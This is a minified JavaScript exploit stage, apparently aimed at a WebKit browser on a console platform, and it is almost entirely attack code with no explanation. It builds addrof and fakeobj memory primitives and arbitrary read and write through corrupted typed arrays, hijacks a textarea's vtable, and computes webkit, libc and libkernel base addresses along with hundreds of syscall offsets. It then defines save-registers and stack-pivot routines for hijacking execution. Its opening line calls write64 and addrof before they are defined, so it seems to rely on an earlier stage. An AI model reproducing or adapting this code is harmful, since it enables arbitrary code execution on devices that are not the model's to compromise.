var oob_master=new Uint32Array(1024),oob_slave=new Uint8Array(1024),leaker_arr=new Uint32Array(1024),leaker_obj={a:1234};write64(addrof(oob_master).add(16),addrof(oob_slave)),write64(addrof(leaker_arr).add(16),addrof(leaker_obj));var i48_put=function(e,_){_[4]=0|e,_[5]=e/4294967296|0},i48_get=function(e){return e[4]+4294967296*e[5]},addrof=function(e){return leaker_obj.a=e,i48_get(leaker_arr)},fakeobj=function(e){return i48_put(e,leaker_arr),leaker_obj.a},read_mem_setup=function(e,_){i48_put(e,oob_master),oob_master[6]=_},read_mem=function(e,_){read_mem_setup(e,_);for(var a=[],r=0;r<_;r++)a.push(oob_slave[r]);return a},read_mem_s=function(e,_){return read_mem_setup(e,_),""+oob_slave},read_mem_b=function(e,_){read_mem_setup(e,_);_=new Uint8Array(_);return _.set(oob_slave),_},read_mem_as_string=function(e,_){for(var a=read_mem_b(e,_),r="",l=0;l<a.length;l++)r+=String.fromCharCode(a[l]);return r},write_mem=function(e,_){i48_put(e,oob_master),oob_master[6]=_.length;for(var a=0;a<_.length;a++)oob_slave[a]=_[a]},read_ptr_at=function(e){for(var _=0,a=read_mem(e,8),r=7;0<=r;r--)_=256*_+a[r];return _},write_ptr_at=function(e,_){for(var a=[],r=0;r<8;r++)a.push(255&_),_/=256;write_mem(e,a)},hex=function(e){return new Number(e).toString(16)},malloc_nogc=[];function malloc(e){e=new Uint8Array(e);return malloc_nogc.push(e),read_ptr_at(addrof(e)+16)}var tarea=document.createElement("textarea"),real_vt_ptr=read_ptr_at(addrof(tarea)+24),fake_vt_ptr=malloc(1024);write_mem(fake_vt_ptr,read_mem(real_vt_ptr,1024));var real_vtable=read_ptr_at(fake_vt_ptr),fake_vtable=malloc(8192);write_mem(fake_vtable,read_mem(real_vtable,8192)),write_ptr_at(fake_vt_ptr,fake_vtable);var fake_vt_ptr_bak=malloc(1024);write_mem(fake_vt_ptr_bak,read_mem(fake_vt_ptr,1024));var plt_ptr=read_ptr_at(fake_vtable)-10142888;function get_got_addr(e){var e=plt_ptr+16*e,_=read_mem(e,6);if(255!=_[0]||37!=_[1])throw"invalid GOT entry";for(var a=0,r=5;2<=r;r--)a=256*a+_[r];return read_ptr_at(a+=e+6)}var webkit_base=read_ptr_at(fake_vtable)-9437184,libkernel_base=get_got_addr(789),libc_base=get_got_addr(573),saveall_addr=libc_base+141972,loadall_addr=libc_base+159464,pivot_addr=libc_base+159582,infloop_addr=libc_base+234480,jop_frame_addr=libc_base+420272,get_errno_addr_addr=libkernel_base+71696,pthread_create_addr=libkernel_base+94608,sigtimedwait_addr=libkernel_base+157472,sigwaitinfo_addr=libkernel_base+157504,evf_set_addr=libkernel_base+157536,sigaction_addr=libkernel_base+157568,pselect_addr=libkernel_base+157600,cpumode_yield_addr=libkernel_base+157632,dynlib_get_list_for_libdbg_addr=libkernel_base+157664,blockpool_map_addr=libkernel_base+157696,netgetiflist_addr=libkernel_base+157728,fstatfs_addr=libkernel_base+157760,sigprocmask_addr=libkernel_base+157792,socket_addr=libkernel_base+157824,fpathconf_addr=libkernel_base+157856,osem_trywait_addr=libkernel_base+157888,get_paging_stats_of_all_threads_addr=libkernel_base+157920,ksem_unlink_addr=libkernel_base+157952,socketpair_addr=libkernel_base+157984,localtime_to_utc_addr=libkernel_base+158016,get_cpu_usage_all_addr=libkernel_base+158048,dynlib_get_obj_member_addr=libkernel_base+158080,getdtablesize_addr=libkernel_base+158112,wait4_addr=libkernel_base+158144,reserve_2mb_page_addr=libkernel_base+158176,fsync_addr=libkernel_base+158208,getrusage_addr=libkernel_base+158240,thr_suspend_addr=libkernel_base+158272,blockpool_unmap_addr=libkernel_base+158304,ftruncate_addr=libkernel_base+158336,ksem_init_addr=libkernel_base+158368,revoke_addr=libkernel_base+158400,evf_trywait_addr=libkernel_base+158432,dynlib_get_info_for_libdbg_addr=libkernel_base+158464,mlockall_addr=libkernel_base+158496,getsid_addr=libkernel_base+158528,chmod_addr=libkernel_base+158560,get_proc_type_info_addr=libkernel_base+158592,mdbg_service_addr=libkernel_base+158624,sched_yield_addr=libkernel_base+158656,sched_setparam_addr=libkernel_base+158688,aio_suspend_addr=libkernel_base+158720,dmem_container_addr=libkernel_base+158752,thr_set_ucontext_addr=libkernel_base+158784,aio_create_addr=libkernel_base+158816,thr_kill_addr=libkernel_base+158848,blockpool_move_addr=libkernel_base+158880,mincore_addr=libkernel_base+158912,get_self_auth_info_addr=libkernel_base+158944,pwrite_addr=libkernel_base+158976,setsockopt_addr=libkernel_base+159008,is_in_sandbox_addr=libkernel_base+159040,connect_addr=libkernel_base+159072,set_timezone_info_addr=libkernel_base+159104,setrlimit_addr=libkernel_base+159136,dl_get_list_addr=libkernel_base+159168,getpeername_addr=libkernel_base+159200,get_gpo_addr=libkernel_base+159232,chflags_addr=libkernel_base+159264,ksem_getvalue_addr=libkernel_base+159296,dynlib_get_info_addr=libkernel_base+159328,evf_delete_addr=libkernel_base+159360,sched_getscheduler_addr=libkernel_base+159392,mname_addr=libkernel_base+159424,adjtime_addr=libkernel_base+159456,lstat_addr=libkernel_base+159488,rmdir_addr=libkernel_base+159520,dynlib_load_prx_addr=libkernel_base+159552,kldunloadf_addr=libkernel_base+159584,ksem_trywait_addr=libkernel_base+159616,dynlib_get_info2_addr=libkernel_base+159648,ksem_post_addr=libkernel_base+159680,setreuid_addr=libkernel_base+159712,ioctl_addr=libkernel_base+159744,clock_gettime_addr=libkernel_base+159776,budget_get_ptype_addr=libkernel_base+159808,opmc_get_hw_addr=libkernel_base+159840,sigsuspend_addr=libkernel_base+159872,netcontrol_addr=libkernel_base+159904,utimes_addr=libkernel_base+159936,aio_multi_wait_addr=libkernel_base+159968,fstat_addr=libkernel_base+16e4,blockpool_batch_addr=libkernel_base+160032,ktimer_create_addr=libkernel_base+160064,setregid_addr=libkernel_base+160096,aio_submit_addr=libkernel_base+160128,ksem_timedwait_addr=libkernel_base+160160,socketclose_addr=libkernel_base+160192,setuid_addr=libkernel_base+160224,osem_close_addr=libkernel_base+160256,jitshm_create_addr=libkernel_base+160288,getuid_addr=libkernel_base+160320,munmap_addr=libkernel_base+160352,ksem_wait_addr=libkernel_base+160384,ksem_destroy_addr=libkernel_base+160416,sched_get_priority_max_addr=libkernel_base+160448,regmgr_call_addr=libkernel_base+160480,poll_addr=libkernel_base+160512,getdents_addr=libkernel_base+160544,clock_settime_addr=libkernel_base+160576,ktimer_settime_addr=libkernel_base+160608,process_terminate_addr=libkernel_base+160640,ksem_open_addr=libkernel_base+160672,execve_addr=libkernel_base+160704,get_resident_fmem_count_addr=libkernel_base+160736,mkdir_addr=libkernel_base+160768,thr_exit_addr=libkernel_base+160800,sigaltstack_addr=libkernel_base+160832,dynlib_process_needed_and_relocate_addr=libkernel_base+160864,getpid_addr=libkernel_base+160896,rdup_addr=libkernel_base+160928,rfork_addr=libkernel_base+160969,sys_exit_addr=libkernel_base+161002,batch_map_addr=libkernel_base+161040,cpuset_setaffinity_addr=libkernel_base+161072,_umtx_unlock_addr=libkernel_base+161104,get_page_table_stats_addr=libkernel_base+161136,evf_clear_addr=libkernel_base+161168,dynlib_get_list2_addr=libkernel_base+161200,munlockall_addr=libkernel_base+161232,getppid_addr=libkernel_base+161264,evf_create_addr=libkernel_base+161296,shm_unlink_addr=libkernel_base+161328,sched_getparam_addr=libkernel_base+161360,access_addr=libkernel_base+161392,lseek_addr=libkernel_base+161424,getrlimit_addr=libkernel_base+161456,unlink_addr=libkernel_base+161488,opmc_disable_addr=libkernel_base+161520,osem_cancel_addr=libkernel_base+161552,getlogin_addr=libkernel_base+161584,writev_addr=libkernel_base+161616,netgetsockinfo_addr=libkernel_base+161648,dup_addr=libkernel_base+161680,recvmsg_addr=libkernel_base+161712,futimes_addr=libkernel_base+161744,get_kernel_mem_statistics_addr=libkernel_base+161776,thr_get_ucontext_addr=libkernel_base+161808,sigprocmask_addr=libkernel_base+161843,thr_get_name_addr=libkernel_base+161984,virtual_query_addr=libkernel_base+162016,virtual_query_all_addr=libkernel_base+162048,chdir_addr=libkernel_base+162080,getegid_addr=libkernel_base+162112,get_sdk_compiled_version_addr=libkernel_base+162144,kevent_addr=libkernel_base+162176,get_vm_map_timestamp_addr=libkernel_base+162208,sysarch_addr=libkernel_base+162240,thr_create_addr=libkernel_base+162272,jitshm_alias_addr=libkernel_base+162304,close_addr=libkernel_base+162336,profil_addr=libkernel_base+162368,rtprio_thread_addr=libkernel_base+162400,settimeofday_addr=libkernel_base+162432,cpuset_getaffinity_addr=libkernel_base+162464,get_resident_count_addr=libkernel_base+162496,opmc_get_ctr_addr=libkernel_base+162528,sched_get_priority_min_addr=libkernel_base+162560,opmc_set_ctr_addr=libkernel_base+162592,mmap_dmem_addr=libkernel_base+162624,sigreturn_addr=libkernel_base+162656,nanosleep_addr=libkernel_base+162688,select_addr=libkernel_base+162720,evf_close_addr=libkernel_base+162752,openat_addr=libkernel_base+162784,aio_multi_cancel_addr=libkernel_base+162816,kqueue_addr=libkernel_base+162848,osem_post_addr=libkernel_base+162880,setgroups_addr=libkernel_base+162912,reboot_addr=libkernel_base+162944,dup2_addr=libkernel_base+162976,fchflags_addr=libkernel_base+163008,get_phys_page_size_addr=libkernel_base+163040,dynlib_do_copy_relocations_addr=libkernel_base+163072,stat_addr=libkernel_base+163104,utc_to_localtime_addr=libkernel_base+163136,evf_cancel_addr=libkernel_base+163168,open_addr=libkernel_base+163200,set_uevt_addr=libkernel_base+163232,getgroups_addr=libkernel_base+163264,sched_rr_get_interval_addr=libkernel_base+163296,getsockname_addr=libkernel_base+163328,query_memory_protection_addr=libkernel_base+163360,ktimer_delete_addr=libkernel_base+163392,netabort_addr=libkernel_base+163424,thr_wake_addr=libkernel_base+163456,getcontext_addr=libkernel_base+163492,sys_exit_addr=libkernel_base+163536,sched_setscheduler_addr=libkernel_base+163568,evf_open_addr=libkernel_base+163600,recvfrom_addr=libkernel_base+163632,opmc_set_hw_addr=libkernel_base+163664,dl_get_info_addr=libkernel_base+163696,bind_addr=libkernel_base+163728,opmc_set_ctl_addr=libkernel_base+163760,blockpool_open_addr=libkernel_base+163792,dynlib_get_list_addr=libkernel_base+163824,aio_submit_cmd_addr=libkernel_base+163856,thr_new_addr=libkernel_base+163888,ipmimgr_call_addr=libkernel_base+163920,munlock_addr=libkernel_base+163952,mmap_addr=libkernel_base+163984,getgid_addr=libkernel_base+164016,osem_open_addr=libkernel_base+164048,aio_multi_delete_addr=libkernel_base+164080,opmc_enable_addr=libkernel_base+164112,clock_getres_addr=libkernel_base+164144,set_chicken_switches_addr=libkernel_base+164176,getpriority_addr=libkernel_base+164208,read_addr=libkernel_base+164240,osem_delete_addr=libkernel_base+164272,setegid_addr=libkernel_base+164304,sync_addr=libkernel_base+164336,get_cpu_usage_proc_addr=libkernel_base+164368,sigqueue_addr=libkernel_base+164400,fork_addr=libkernel_base+164432,get_authinfo_addr=libkernel_base+164464,madvise_addr=libkernel_base+164496,swapcontext_addr=libkernel_base+164528,namedobj_create_addr=libkernel_base+164560,dynlib_unload_prx_addr=libkernel_base+164592,issetugid_addr=libkernel_base+164624,readv_addr=libkernel_base+164656,mprotect_addr=libkernel_base+164688,test_debug_rwmem_addr=libkernel_base+164720,fdatasync_addr=libkernel_base+164752,osem_wait_addr=libkernel_base+164784,ktimer_gettime_addr=libkernel_base+164816,rename_addr=libkernel_base+164848,kill_addr=libkernel_base+164880,flock_addr=libkernel_base+164912,write_addr=libkernel_base+164944,app_state_change_addr=libkernel_base+164976,pathconf_addr=libkernel_base+165008,ktimer_getoverrun_addr=libkernel_base+165040,seteuid_addr=libkernel_base+165072,socketex_addr=libkernel_base+165104,thr_resume_ucontext_addr=libkernel_base+165136,randomized_path_addr=libkernel_base+165168,_umtx_lock_addr=libkernel_base+165200,setitimer_addr=libkernel_base+165232,execve_addr=libkernel_base+165277,accept_addr=libkernel_base+165312,get_paging_stats_of_all_objects_addr=libkernel_base+165344,getsockopt_addr=libkernel_base+165376,pwritev_addr=libkernel_base+165408,_umtx_op_addr=libkernel_base+165440,preadv_addr=libkernel_base+165456,dynlib_get_info_ex_addr=libkernel_base+165504,debug_init_addr=libkernel_base+165536,dynlib_get_proc_param_addr=libkernel_base+165568,set_vm_container_addr=libkernel_base+165600,ksem_close_addr=libkernel_base+165632,aio_get_data_addr=libkernel_base+165664,fchmod_addr=libkernel_base+165696,sendfile_addr=libkernel_base+165728,aio_multi_poll_addr=libkernel_base+165760,mlock_addr=libkernel_base+165792,sigwait_addr=libkernel_base+165824,evf_wait_addr=libkernel_base+165856,workaround8849_addr=libkernel_base+165888,shm_open_addr=libkernel_base+165920,_umtx_op_addr=libkernel_base+165952,sendto_addr=libkernel_base+165984,free_stack_addr=libkernel_base+166192,shutdown_addr=libkernel_base+166224,thr_set_name_addr=libkernel_base+166256,listen_addr=libkernel_base+166288,physhm_unlink_addr=libkernel_base+166320,thr_suspend_ucontext_addr=libkernel_base+166352,__sysctl_addr=libkernel_base+166384,thr_kill2_addr=libkernel_base+166416,osem_create_addr=libkernel_base+166448,thr_self_addr=libkernel_base+166480,setsid_addr=libkernel_base+166512,physhm_open_addr=libkernel_base+166544,get_map_statistics_addr=libkernel_base+166576,setpriority_addr=libkernel_base+166608,msync_addr=libkernel_base+166640,gettimeofday_addr=libkernel_base+166672,setcontext_addr=libkernel_base+166704,kqueueex_addr=libkernel_base+166736,pipe_addr=libkernel_base+166768,sandbox_path_addr=libkernel_base+166816,setlogin_addr=libkernel_base+166848,getitimer_addr=libkernel_base+166896,dynlib_dlsym_addr=libkernel_base+166928,dl_get_metadata_addr=libkernel_base+166960,get_bio_usage_all_addr=libkernel_base+166992,getdirentries_addr=libkernel_base+167024,set_phys_fmem_limit_addr=libkernel_base+167056,is_development_mode_addr=libkernel_base+167088,mtypeprotect_addr=libkernel_base+167120,aio_init_addr=libkernel_base+167152,sigpending_addr=libkernel_base+167184,pread_addr=libkernel_base+167216,cpuset_getid_addr=libkernel_base+167248,geteuid_addr=libkernel_base+167280,fcntl_addr=libkernel_base+167312,uuidgen_addr=libkernel_base+167344,set_gpo_addr=libkernel_base+167376,sendmsg_addr=libkernel_base+167408,truncate_addr=libkernel_base+167440,namedobj_delete_addr=libkernel_base+167472;function saveall(){var e=malloc(2048);read_ptr_at(fake_vtable+472);write_ptr_at(fake_vtable+472,saveall_addr),write_ptr_at(addrof(tarea)+24,fake_vt_ptr),tarea.scrollLeft=0,write_ptr_at(addrof(tarea)+24,real_vt_ptr),write_mem(e,read_mem(fake_vt_ptr,1024)),write_mem(fake_vt_ptr,read_mem(fake_vt_ptr_bak,1024));read_ptr_at(fake_vtable+472);return write_ptr_at(fake_vtable+472,saveall_addr),write_ptr_at(fake_vt_ptr+56,4660),write_ptr_at(addrof(tarea)+24,fake_vt_ptr),tarea.scrollLeft=0,write_ptr_at(addrof(tarea)+24,real_vt_ptr),write_mem(e+1024,read_mem(fake_vt_ptr,1024)),write_mem(fake_vt_ptr,read_mem(fake_vt_ptr_bak,1024)),e}function pivot(e){var _=malloc(1024);read_ptr_at(fake_vtable+472);write_ptr_at(fake_vtable+472,saveall_addr),write_ptr_at(addrof(tarea)+24,fake_vt_ptr),tarea.scrollLeft=0,write_ptr_at(addrof(tarea)+24,real_vt_ptr),write_mem(_,read_mem(fake_vt_ptr,1024)),write_mem(fake_vt_ptr,read_mem(fake_vt_ptr_bak,1024));read_ptr_at(fake_vtable+472);write_ptr_at(fake_vtable+472,pivot_addr),write_ptr_at(fake_vt_ptr+56,e),write_ptr_at(_+56,read_ptr_at(_+56)-16),write_ptr_at(e,_),write_ptr_at(addrof(tarea)+24,fake_vt_ptr),tarea.scrollLeft=0,write_ptr_at(addrof(tarea)+24,real_vt_ptr),write_mem(fake_vt_ptr,read_mem(fake_vt_ptr_bak,1024))}